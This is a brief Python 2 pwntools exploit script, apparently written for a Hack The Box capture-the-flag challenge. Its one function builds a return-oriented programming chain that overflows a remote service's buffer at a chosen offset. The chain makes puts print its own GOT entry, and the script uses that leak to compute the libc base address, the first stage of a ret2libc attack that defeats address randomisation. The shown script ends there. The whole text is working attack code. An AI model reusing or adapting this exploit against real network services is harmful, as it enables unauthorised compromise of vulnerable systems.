#!/usr/bin/python2
#Author: Wh04m1 (@filip_dragovic)

from pwn import *




context(os='linux', arch='amd64')
if args['DEBUG']:
	context.log_level='DEBUG'

def leak(host,port,offset,binary,libc):
    elf = ELF(binary)
    libc = ELF(libc)
    rop = ROP(elf)
    rop.call(elf.sym.puts, [elf.got.puts])
    rop.call(elf.sym.main)
    success(rop.dump())
    p = remote(host, port)
    #p = remote('docker.hackthebox.eu', 32443)
    p.recvuntil("?")
    p.sendline(fit({int(offset):rop.chain()}))
    p.recv()
    puts = u64(p.recv()[:6].strip().ljust(8 , b'\x00'))
    info("puts will be at @{a}".format(a=hex(puts)))
    libc.address = puts - libc.symbols['puts']
    info("libc_base will be @{a}".format(a=hex(libc.address)))
